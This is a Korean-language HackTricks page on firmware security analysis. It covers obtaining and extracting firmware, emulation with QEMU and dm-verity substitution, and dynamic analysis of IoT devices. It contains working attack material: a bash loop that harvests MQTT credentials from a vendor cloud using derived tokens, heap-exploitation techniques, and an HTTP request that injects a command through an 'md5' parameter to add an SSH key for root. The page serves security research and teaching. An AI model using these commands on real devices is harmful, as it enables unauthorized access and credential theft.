# 펌웨어 분석

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **소개**

### 관련 리소스

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

펌웨어는 하드웨어 구성 요소와 사용자가 상호작용하는 소프트웨어 간의 통신을 관리하고 지원하여 기기가 올바르게 작동하도록 하는 필수 소프트웨어입니다. 펌웨어는 영구 메모리에 저장되므로 기기의 전원이 켜지는 순간부터 필요한 명령어에 접근할 수 있으며, 이를 통해 운영 체제가 시작됩니다. 보안 취약점을 식별하는 데 펌웨어를 조사하고 필요에 따라 수정하는 것은 중요한 단계입니다.<sup>[[2]](#references)[[3]](#references)</sup>

## **정보 수집**

**정보 수집**은 기기의 구성과 기기에서 사용하는 기술을 파악하는 데 중요한 첫 단계입니다. 이 과정에서는 다음에 관한 데이터를 수집합니다.

- CPU 아키텍처 및 기기에서 실행되는 운영 체제
- 부트로더 세부 정보
- 하드웨어 구성 및 데이터시트
- 코드베이스 지표 및 소스 위치
- 외부 라이브러리 및 라이선스 유형
- 업데이트 기록 및 규제 인증
- 아키텍처 및 흐름도
- 보안 평가 및 식별된 취약점

이 과정에서는 **오픈 소스 인텔리전스(OSINT)** 도구가 매우 유용하며, 사용 가능한 오픈 소스 소프트웨어 구성 요소를 수동 및 자동화 검토 방식으로 분석하는 것도 중요합니다. [Coverity Scan](https://scan.coverity.com) 및 [Semmle’s LGTM](https://lgtm.com/#explore)과 같은 도구는 잠재적 문제를 찾는 데 활용할 수 있는 무료 정적 분석 기능을 제공합니다.

## **펌웨어 확보**

펌웨어는 여러 방법으로 확보할 수 있으며, 방법마다 난이도가 다릅니다.

- 개발자나 제조업체 등 출처에서 **직접 확보**
- 제공된 지침에 따라 **빌드**
- 공식 지원 사이트에서 **다운로드**
- 호스팅된 펌웨어 파일을 찾기 위해 **Google dork** 검색어 활용
- [S3Scanner](https://github.com/sa7mon/S3Scanner)와 같은 도구를 사용해 **cloud storage**에 직접 접근
- man-in-the-middle 기법으로 **업데이트** 가로채기
- **UART**, **JTAG**, **PICit** 등의 연결을 통해 기기에서 **추출**
- 기기 통신에서 업데이트 요청 **스니핑**
- **하드코딩된 업데이트 엔드포인트** 식별 및 사용
- 부트로더나 네트워크에서 **덤프**
- 다른 방법이 모두 실패하면 적절한 하드웨어 도구를 사용해 저장 칩을 **분리하여 읽기**

### UART 로그만 있는 경우: 플래시의 U-Boot 환경 변수로 root shell 강제 실행

UART RX가 무시되는 경우(로그만 출력되는 경우)에도 오프라인에서 **U-Boot 환경 변수 블롭을 편집**해 init shell을 강제로 실행할 수 있습니다.<sup>[[6]](#references)</sup>

1. SOIC-8 클립과 프로그래머(3.3V)를 사용해 SPI 플래시를 덤프합니다:
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. U-Boot env 파티션을 찾고 `bootargs`를 수정해 `init=/bin/sh`를 포함한 다음, blob의 **U-Boot env CRC32를 다시 계산**합니다.
3. env 파티션만 다시 플래시하고 재부팅하면 UART에 shell이 나타납니다.

이 방법은 bootloader shell이 비활성화되어 있지만 외부 플래시 접근을 통해 env 파티션에 쓸 수 있는 임베디드 장치에서 유용합니다.

## 펌웨어 분석하기

이제 **펌웨어를 확보했으므로**, 이를 어떻게 다뤄야 할지 파악하기 위해 정보를 추출해야 합니다. 이를 위해 사용할 수 있는 도구는 다음과 같습니다.

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

해당 도구로 많은 정보를 찾지 못했다면 `binwalk -E <bin>`으로 이미지의 **entropy**를 확인하세요. entropy가 낮으면 암호화되어 있을 가능성이 낮습니다. entropy가 높으면 암호화되어 있을 가능성이 높습니다(또는 어떤 방식으로든 압축되었을 수 있습니다).

또한 다음 도구를 사용해 **firmware 내부에 포함된 파일**을 추출할 수 있습니다:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

또는 [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/))로 파일을 검사할 수 있습니다.

### 파일시스템 가져오기

앞서 언급한 도구(예: `binwalk -ev <bin>`)를 사용하면 **파일시스템을 추출**할 수 있습니다.\
Binwalk는 보통 파일시스템 유형의 **이름을 딴 폴더** 안에 파일시스템을 추출합니다. 파일시스템 유형은 대개 다음 중 하나입니다: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### 파일시스템 수동 추출

경우에 따라 binwalk의 signature에 파일시스템의 **magic byte**가 포함되어 있지 않을 수 있습니다. 이럴 때는 binwalk를 사용해 **파일시스템의 offset을 찾고**, binary에서 **압축된 파일시스템을 carve한 다음**, 아래 단계에 따라 유형에 맞게 파일시스템을 **수동으로 추출**하세요.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Squashfs 파일 시스템을 carving하려면 다음 **dd command**를 실행합니다.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

또는 다음 명령을 실행할 수도 있습니다.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- squashfs (위 예시에서 사용)

`$ unsquashfs dir.squashfs`

이후 파일은 "`squashfs-root`" 디렉터리에 저장됩니다.

- CPIO 아카이브 파일

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- jffs2 파일 시스템

`$ jefferson rootfsfile.jffs2`

- NAND flash를 사용하는 ubifs 파일 시스템

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## 펌웨어 분석

펌웨어를 확보한 후에는 구조와 잠재적 취약점을 파악하기 위해 펌웨어를 분석하는 것이 중요합니다. 이 과정에는 다양한 도구를 사용해 펌웨어 이미지를 분석하고 유용한 데이터를 추출하는 작업이 포함됩니다.

### 초기 분석 도구

바이너리 파일(`<bin>`으로 표시)을 초기에 검사하기 위한 명령어 모음입니다. 이 명령어를 사용하면 파일 유형을 식별하고, 문자열을 추출하고, 바이너리 데이터를 분석하며, 파티션 및 파일 시스템 정보를 파악할 수 있습니다:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

이미지의 암호화 상태를 평가하려면 `binwalk -E <bin>`으로 **entropy**를 확인합니다. 엔트로피가 낮으면 암호화되지 않았을 가능성이 있고, 높으면 암호화되었거나 압축되었을 가능성이 있습니다.

**embedded files**를 추출할 때는 **file-data-carving-recovery-tools** 문서와 파일 검사 도구인 **binvis.io** 같은 도구와 리소스를 사용하는 것이 좋습니다.

### 파일 시스템 추출

`binwalk -ev <bin>`을 사용하면 일반적으로 파일 시스템을 추출할 수 있으며, 추출 결과는 대개 파일 시스템 유형을 이름으로 한 디렉터리(예: squashfs, ubifs)에 저장됩니다. 그러나 magic bytes가 없어 **binwalk**가 파일 시스템 유형을 인식하지 못하면 수동 추출이 필요합니다. 이때 `binwalk`로 파일 시스템의 오프셋을 찾은 다음 `dd` 명령어로 파일 시스템을 carve out합니다:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

이후 파일 시스템 유형(squashfs, cpio, jffs2, ubifs 등)에 따라 콘텐츠를 수동으로 추출하는 데 서로 다른 명령을 사용합니다.

### 파일 시스템 분석

파일 시스템을 추출하면 보안 결함을 찾기 시작합니다. 보안이 취약한 네트워크 데몬, 하드코딩된 자격 증명, API 엔드포인트, 업데이트 서버 기능, 컴파일되지 않은 코드, 시작 스크립트, 오프라인 분석을 위한 컴파일된 바이너리에 주의를 기울입니다.

검사해야 할 **주요 위치**와 **항목**은 다음과 같습니다.

- 사용자 자격 증명을 확인하기 위한 **etc/shadow** 및 **etc/passwd**
- **etc/ssl**의 SSL 인증서 및 키
- 잠재적 취약점이 있는 구성 파일 및 스크립트
- 추가 분석을 위한 임베디드 바이너리
- 일반적인 IoT 기기 웹 서버 및 바이너리

파일 시스템에서 민감한 정보와 취약점을 찾는 데 다음 도구를 사용할 수 있습니다.

- 민감한 정보 검색을 위한 [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) 및 [**Firmwalker**](https://github.com/craigz28/firmwalker)
- 포괄적인 펌웨어 분석을 위한 [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core)
- 정적 및 동적 분석을 위한 [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) 및 [**EMBA**](https://github.com/e-m-b-a/emba)

### 컴파일된 바이너리의 보안 검사

파일 시스템에서 발견한 소스 코드와 컴파일된 바이너리 모두 취약점이 있는지 면밀히 검사해야 합니다. Unix 바이너리용 **checksec.sh**와 Windows 바이너리용 **PESecurity** 같은 도구를 사용하면 악용될 수 있는 보호되지 않은 바이너리를 식별할 수 있습니다.

## 파생 URL 토큰을 이용한 cloud config 및 MQTT 자격 증명 수집

많은 IoT 허브는 다음과 같은 cloud 엔드포인트에서 기기별 구성을 가져옵니다.<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

펌웨어 분석 중에 `<token>`이 하드코딩된 비밀값을 사용해 기기에서 로컬로 파생되는 것을 발견할 수 있습니다. 예를 들면 다음과 같습니다.

- token = MD5( deviceId || STATIC_KEY )이며 대문자 16진수로 표현됨

이 설계에서는 deviceId와 STATIC_KEY를 알아낸 누구나 URL을 재구성해 cloud config를 가져올 수 있으며, 이 과정에서 평문 MQTT 자격 증명과 topic 접두사가 드러나는 경우가 많습니다.

실제 작업 흐름:

1) UART 부팅 로그에서 deviceId 추출

- 3.3V UART 어댑터(TX/RX/GND)를 연결하고 로그를 캡처합니다:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- 클라우드 설정 URL 패턴과 broker 주소를 출력하는 줄을 찾습니다. 예를 들면:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) firmware에서 STATIC_KEY와 token 알고리즘 복구

- 바이너리를 Ghidra/radare2에 로드하고 config 경로("/pf/") 또는 MD5 사용을 검색합니다.
- 알고리즘을 확인합니다(예: MD5(deviceId||STATIC_KEY)).
- Bash에서 token을 계산하고 digest를 대문자로 변환합니다:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) 클라우드 설정 및 MQTT 자격 증명 수집

- URL을 구성하고 curl로 JSON을 가져온 다음, jq로 파싱해 secrets를 추출합니다:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) 평문 MQTT 및 취약한 topic ACL 악용(있는 경우)

- 복구한 자격 증명으로 maintenance topic을 구독하고 민감한 이벤트를 찾습니다:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) 예측 가능한 장치 ID 열거(대규모로, 승인하에)

- 많은 생태계에서 vendor OUI/product/type 바이트 뒤에 순차적인 접미사를 붙입니다.
- 후보 ID를 순회하고, 토큰을 도출한 다음, 프로그래밍 방식으로 설정을 가져올 수 있습니다:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

메모
- 대량 열거를 시도하기 전에 항상 명시적인 승인을 받으세요.
- 가능하면 대상 하드웨어를 수정하지 않고 에뮬레이션이나 정적 분석을 통해 비밀을 복구하세요.

펌웨어를 에뮬레이션하면 기기의 작동 방식이나 개별 프로그램에 대한 **동적 분석**이 가능합니다. 이 접근 방식은 하드웨어 또는 아키텍처 종속성으로 인해 어려움을 겪을 수 있지만, Raspberry Pi와 같이 아키텍처와 엔디언이 일치하는 기기나 사전 구축된 가상 머신으로 루트 파일 시스템 또는 특정 바이너리를 옮기면 추가 테스트를 진행할 수 있습니다.

### 개별 바이너리 에뮬레이션

단일 프로그램을 검사할 때는 프로그램의 엔디언과 CPU 아키텍처를 파악하는 것이 중요합니다.

#### MIPS 아키텍처 예제

MIPS 아키텍처 바이너리를 에뮬레이션하려면 다음 명령을 사용할 수 있습니다:

```bash
file ./squashfs-root/bin/busybox
```

그리고 필요한 에뮬레이션 도구를 설치하려면:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

MIPS(big-endian)의 경우 `qemu-mips`를 사용하며, little-endian 바이너리에는 `qemu-mipsel`을 사용합니다.

#### ARM Architecture Emulation

ARM 바이너리의 경우에도 과정은 비슷하며, 에뮬레이션에는 `qemu-arm` 에뮬레이터를 사용합니다.

### Full System Emulation

[Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) 등의 도구는 전체 firmware 에뮬레이션을 지원하여 과정을 자동화하고 동적 분석을 돕습니다.

### 에뮬레이션을 위한 분할 및 검증된 root 파일시스템 재구성

SquashFS superblock은 읽을 수 있지만 inode, directory 또는 fragment-table offset이 불가능한 값이라면, `unsquashfs`를 바로 수정하지 마세요. 초기 부팅 바이너리를 역공학하고 해당 바이너리가 생성하는 block-device 그래프를 재현하세요. 임베디드 시스템에서는 명목상 root partition을 제공하면서도 다른 partition에서 빌려온 sector를 추가하는 `dm-linear` 매핑으로 실제 파일시스템을 구성할 수 있습니다. superblock만 검사하면 이후의 모든 metadata block이 어긋나 있어도 정상적으로 보일 수 있습니다.<sup>[[9]](#references)</sup>

firmware의 연산을 정확히 그대로 보존하세요. 특히 길이가 byte, 512-byte sector, 4 KiB page 중 어떤 단위인지 확인하고, shift와 truncation을 원래 순서대로 재현하며, A/B 레이아웃에서 bank에 따라 달라지는 tail 영역도 고려하세요. 예를 들어 `(partition_bytes >> 12) << 3`은 먼저 4 KiB 경계로 내림한 다음 결과를 512-byte sector 단위로 나타냅니다. 이를 `partition_bytes // 512`로 대체하면 추가된 extent의 위치가 몇 kilobyte 정도 달라져 이후의 모든 SquashFS table이 손상될 수 있습니다.<sup>[[9]](#references)</sup>

유용한 검증 절차는 다음과 같습니다.<sup>[[9]](#references)</sup>

1. verifier/init 바이너리에서 각 `dm-linear` segment의 source device, 시작 sector, 길이를 확인합니다.
2. 정렬 의미를 바꾸지 않고 extent를 이어 붙이거나 매핑합니다.
3. 추출에 계속 실패하면 예측한 경계 주변의 작은 범위만 검색하고, 그럴듯한 superblock 하나만으로 판단하지 말고 여러 개의 연속된 유효 metadata structure가 있는지 확인합니다.
4. 재구성한 이미지에 수정하지 않은 `unsquashfs`를 실행합니다. 모든 directory와 fragment를 성공적으로 순회하는 것은 `unsquashfs -stat`보다 더 강력한 증거입니다.

#### Analyst-controlled dm-verity replacement

분석가가 QEMU kernel, initramfs, virtual disk를 제어한다면, vendor의 검증용 PID 1을 작고 정적으로 링크된 init으로 대체하여 수정된 root를 부팅할 수 있습니다. 이는 **lab boot-chain substitution**이며, dm-verity, RSA signature, Secure Boot 또는 TPM-sealed key를 깨는 것이 아닙니다.<sup>[[9]](#references)</sup>

대체 init은 원래 부팅 경로의 작동에 필요한 부분을 모방해야 합니다. `devtmpfs`를 마운트하고, `setsid()`를 호출하고, `/dev/console`을 file descriptor 0–2에 연결하고, `/proc`과 `/sys`를 마운트하고, 제공된 block device가 나타날 때까지 기다린 다음, 편집한 root를 읽기 전용으로 마운트해야 합니다. 그런 다음 기존 root의 pseudo-filesystem을 분리하고, 새 마운트를 `/`에 옮기고, `chroot`한 뒤 firmware의 원래 `/sbin/init`을 `execve()`로 실행합니다. `MS_MOVE` **전에** `/dev`, `/proc`, `/sys`를 분리하면 새 root에 속한 mount point를 실수로 분리하는 일을 방지할 수 있습니다.<sup>[[9]](#references)</sup>

변경 가능한 device state는 수정된 불변 root와 분리해 두세요. qcow2 overlay를 사용하면 원본 disk의 LVM state를 보존하면서 두 번째 읽기 전용 virtio disk에서 편집한 SquashFS를 제공할 수 있습니다.<sup>[[9]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### 오프라인 이미지 상태 디버깅

부팅이 느리거나, 시작 스크립트가 데이터를 파괴하거나, 콘솔 로그가 불안정해 오류 원인을 파악하기 어려운 경우 게스트 외부의 영구 상태를 검사하세요. 실행 중인 VM이 사용 중인 overlay는 절대 연결하지 마세요. `qemu-nbd`로 노출하고, LVM 검색 범위를 의도한 NBD 파티션으로 제한한 다음, 연결을 해제하기 전에 볼륨 그룹을 비활성화하세요.<sup>[[9]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

반복 가능한 fault isolation을 위해 안정적인 쓰기 가능 볼륨에 타임스탬프가 포함된 marker 파일을 기록하고 오프라인에서 확인하세요. `/dev/kmsg`, FIFO, 일시적인 콘솔은 rate limiting이나 프로세스의 조기 종료로 인해 false negative를 일으킬 수 있습니다. 또한 관련 없는 코드를 변경하기 전에 각 계층의 인터페이스가 정확히 일치하는지 비교하세요. 예를 들어 `uname -r`과 `/lib/modules/`, 디스크에 있는 ext4 기능과 커널 설정, Mesa `libGL` 세대와 DRI driver ABI 및 PCI에서 파생된 driver 이름을 비교합니다. 구성 요소가 존재하고 `dlopen()`에 성공하더라도, 이를 사용하는 쪽에서 다른 ABI를 기대하면 사용할 수 없는 상태일 수 있습니다.<sup>[[9]](#references)</sup>

## 실제 환경에서의 Dynamic Analysis

이 단계에서는 실제 또는 에뮬레이션된 디바이스 환경을 분석에 사용합니다. OS와 파일시스템에 대한 shell access를 유지하는 것이 중요합니다. 에뮬레이션은 하드웨어 상호작용을 완벽하게 모방하지 못할 수 있으므로, 에뮬레이션을 간혹 재시작해야 할 수 있습니다. 분석 과정에서는 파일시스템을 다시 살펴보고, 노출된 웹페이지와 네트워크 서비스를 exploit하며, bootloader 취약점을 탐색해야 합니다. 잠재적인 backdoor 취약점을 식별하려면 firmware 무결성 테스트가 중요합니다.

## Runtime Analysis 기법

Runtime analysis는 gdb-multiarch, Frida, Ghidra 같은 도구를 사용해 실행 환경에서 프로세스나 바이너리와 상호작용하는 작업입니다. breakpoint를 설정하고 fuzzing 및 기타 기법으로 취약점을 식별합니다.

전체 debugger를 사용할 수 없는 embedded target에서는 **정적으로 링크된 `gdbserver`를 디바이스에 복사하고 원격으로 연결하세요**:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Zigbee / radio-co-processor 메시지 매핑

IoT 허브에서는 RF 스택이 **radio MCU**와 Linux userland 프로세스 간에 분리되는 경우가 많습니다. 다음 경로를 매핑하는 것이 유용합니다:<sup>[[8]](#references)</sup>

1. 공중의 **RF frame**
2. radio MCU의 **controller-side parser**
3. Linux로 전달되는 **serial/UART 텍스트 또는 TLV 프로토콜**(예: `/dev/tty*`)
4. 메인 daemon의 **application dispatcher**
5. **프로토콜별 handler / state machine**

이 아키텍처에서는 하나가 아니라 두 개의 리버싱 대상이 생깁니다. 컨트롤러가 바이너리 radio frame을 `Group,Command,arg1,arg2,...` 같은 텍스트 프로토콜로 변환한다면 다음을 파악하세요.

- **메시지 그룹**과 dispatch table
- 어떤 메시지가 **network**에서 올 수 있고 어떤 메시지가 컨트롤러 자체에서 오는지
- 정확한 **manufacturer-specific discriminator field**(예: Zigbee `manufacturer_code` 및 custom `cluster_command`)
- **commissioning**, discovery 또는 firmware/model 다운로드 단계에서만 도달 가능한 handler

Zigbee의 경우 pairing 트래픽을 캡처하고 대상이 여전히 기본 **Link Key**인 `ZigBeeAlliance09`에 의존하는지 확인하세요. 그렇다면 commissioning 트래픽을 스니핑해 **Network Key**를 노출할 수 있습니다. Zigbee 3.0 install code는 이러한 노출을 줄이므로, 테스트한 장치가 실제로 이를 강제하는지 기록하세요.

### Manufacturer-specific 프로토콜 handler와 FSM으로 제한되는 도달 가능성

Vendor-specific Zigbee/ZCL command는 표준 cluster보다 더 좋은 공격 대상인 경우가 많습니다. 충분히 검증된 경험이 적은 **custom parsing code**와 내부 **FSM**으로 전달되기 때문입니다.<sup>[[8]](#references)</sup>

실용적인 workflow:

- command dispatcher를 리버스 엔지니어링해 **vendor-only handler**를 찾습니다.
- **FSM state**, **event**, **check**, **action**, **next-state** table을 파악합니다.
- 자동으로 진행되는 **transitional state**와 attacker-controlled state를 결국 초기화하거나 해제하는 retry/error 분기를 식별합니다.
- 버그가 있는 handler가 항상 도달 가능하다고 가정하지 말고, daemon을 취약한 state로 전환하는 데 필요한 정상적인 프로토콜 교환을 확인합니다.

타이밍에 민감한 프로토콜에서는 Python framework를 통한 packet replay가 너무 느릴 수 있습니다. 더 안정적인 방법은 vendor-grade stack을 사용해 실제 하드웨어(예: **nRF52840**)에서 정상적인 장치를 에뮬레이션하여 올바른 **endpoint**, **attribute**, commissioning 타이밍을 구현하는 것입니다.

### Embedded daemon의 분할 다운로드 버그 유형

**분할된 blob/model/configuration 다운로드**에서 반복적으로 나타나는 firmware 버그 유형입니다:<sup>[[8]](#references)</sup>

1. **첫 번째 fragment**(`offset == 0`)가 `ctx->total_size`를 저장하고 `malloc(total_size)`를 할당합니다.
2. 이후 fragment는 `packet_total_size >= offset + chunk_len` 같은 attacker-controlled **packet-local** 필드만 검증합니다.
3. 복사 시 원래 할당된 크기와 비교하지 않고 `memcpy(&ctx->buffer[offset], chunk, chunk_len)`을 사용합니다.

이를 통해 공격자는 다음을 보낼 수 있습니다.

- 작은 heap 할당을 유도하는, 선언된 total size가 **작은** 첫 번째 유효 fragment
- **예상 offset**을 사용하지만 더 큰 `chunk_len`을 포함하는 후속 fragment
- 새 검증 조건은 통과하면서 원래 할당된 buffer를 overflow하는 forged packet-local size

취약한 경로가 commissioning 로직 뒤에 있다면, 잘못된 fragment를 보내기 전에 대상이 예상된 model-download 또는 blob-download state에 진입하도록 충분한 **device emulation**을 포함해야 합니다.

### 프로토콜로 유발하는 `free()` 트리거

Embedded daemon에서 heap metadata exploitation을 유발하는 가장 쉬운 방법은 흔히 "정리 작업을 기다리는 것"이 아니라 **프로토콜 자체의 error handling을 강제로 실행하는 것**입니다:<sup>[[8]](#references)</sup>

- 잘못된 후속 fragment를 보내 FSM을 **retry** 또는 **error** state로 전환합니다.
- retry 한도를 넘겨 daemon이 **context를 초기화**하고 손상된 buffer를 해제하게 합니다.
- 프로세스가 다른 이유로 crash하기 전에 이 예측 가능한 `free()`를 이용해 allocator 측 primitive를 트리거합니다.

이는 특히 embedded Linux의 **musl/uClibc/dlmalloc 계열** allocator에 유용합니다. chunk metadata를 손상시키면 unlink/unbin 로직을 write primitive로 바꿀 수 있습니다. 안정적인 패턴은 실제 bin pointer를 즉시 덮어써 프로세스를 crash시키는 대신, **size field**를 손상시켜 allocator가 overflow된 buffer 안에 배치한 **fake chunk**를 따라가도록 유도하는 것입니다.

## Binary Exploitation 및 Proof-of-Concept

식별된 취약점의 PoC를 개발하려면 대상 아키텍처에 대한 깊은 이해와 저수준 언어 프로그래밍이 필요합니다. Embedded system에서는 binary runtime protection이 드물지만, 존재하는 경우 Return Oriented Programming (ROP) 같은 기법이 필요할 수 있습니다.

### uClibc fastbin exploitation 참고 사항 (embedded Linux)

- **Fastbin과 consolidation:** uClibc는 glibc와 유사한 fastbin을 사용합니다. 이후의 대규모 할당에서 `__malloc_consolidate()`가 실행될 수 있으므로 fake chunk는 검사를 통과해야 합니다(정상적인 size, `fd = 0`, 주변 chunk가 "in use"로 인식됨).<sup>[[6]](#references)</sup>
- **ASLR에서의 non-PIE binary:** ASLR이 활성화되어 있지만 메인 binary가 **non-PIE**라면, binary 내부의 `.data/.bss` 주소는 안정적입니다. 이미 유효한 heap chunk header처럼 보이는 영역을 대상으로 하여 fastbin 할당이 **function pointer table**에 도달하게 할 수 있습니다.
- **Parser를 멈추는 NUL:** JSON을 파싱할 때 payload의 `\x00`은 파싱을 멈추면서도 뒤에 이어지는 attacker-controlled byte를 stack pivot/ROP chain용으로 보존할 수 있습니다.
- **`/proc/self/mem`을 통한 shellcode:** `open("/proc/self/mem")`, `lseek()`, `write()`를 호출하는 ROP chain으로 알려진 mapping에 실행 가능한 shellcode를 기록하고 해당 위치로 이동할 수 있습니다.

## Firmware Analysis용 사전 구성 운영 체제

[AttifyOS](https://github.com/adi0x90/attifyos) 및 [EmbedOS](https://github.com/scriptingxss/EmbedOS) 같은 운영 체제는 firmware security testing에 필요한 도구를 갖춘 사전 구성 환경을 제공합니다.

## Firmware 분석용 사전 구성 OS

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS는 Internet of Things (IoT) 장치의 security assessment 및 penetration testing을 지원하도록 제작된 distro입니다. 필요한 모든 도구가 사전 구성된 환경을 제공해 많은 시간을 절약해 줍니다.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): firmware security testing 도구가 미리 설치된 Ubuntu 18.04 기반 embedded security testing 운영 체제입니다.

## Firmware Downgrade 공격 및 안전하지 않은 Update 메커니즘

vendor가 firmware image의 cryptographic signature 검증을 구현하더라도 **version rollback (downgrade) 방지**는 자주 빠져 있습니다. boot- 또는 recovery-loader가 내장된 public key로 signature만 검증하고 flash할 image의 *version*(또는 monotonic counter)을 비교하지 않으면, 공격자는 유효한 signature가 그대로 있는 **오래되고 취약한 firmware**를 정식으로 설치해 이미 패치된 취약점을 다시 노출시킬 수 있습니다.<sup>[[4]](#references)</sup>

일반적인 공격 workflow:

1. **이전 버전의 signed image를 확보합니다.**
   * vendor의 공개 다운로드 portal, CDN 또는 지원 사이트에서 가져옵니다.
   * companion mobile/desktop application에서 추출합니다(예: Android APK의 `assets/firmware/`).
   * VirusTotal, Internet archive, forum 등의 third-party repository에서 가져옵니다.
2. 노출된 update channel을 통해 장치에 image를 **업로드하거나 제공합니다.**
   * Web UI, mobile-app API, USB, TFTP, MQTT 등
   * 여러 consumer IoT 장치는 인증 없이 접근 가능한 HTTP(S) endpoint를 제공하며, Base64로 인코딩된 firmware blob을 받아 server-side에서 decode한 뒤 recovery/upgrade를 실행합니다.
3. downgrade한 뒤 최신 버전에서 패치된 취약점을 악용합니다(예: 이후 추가된 command-injection filter).
4. 선택적으로 persistence를 확보한 뒤 최신 image를 다시 flash하거나 update를 비활성화해 탐지를 피합니다.

### 예시: Downgrade 후 Command Injection

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

취약한(다운그레이드된) 펌웨어에서는 `md5` 매개변수가 정화 없이 셸 명령에 직접 연결되어 임의의 명령을 삽입할 수 있습니다(여기서는 SSH 키 기반 root 액세스를 활성화). 이후 펌웨어 버전에서는 기본적인 문자 필터가 추가되었지만, 다운그레이드 방지 기능이 없어 수정 사항은 무의미합니다.<sup>[[4]](#references)</sup>

### 모바일 앱에서 펌웨어 추출하기

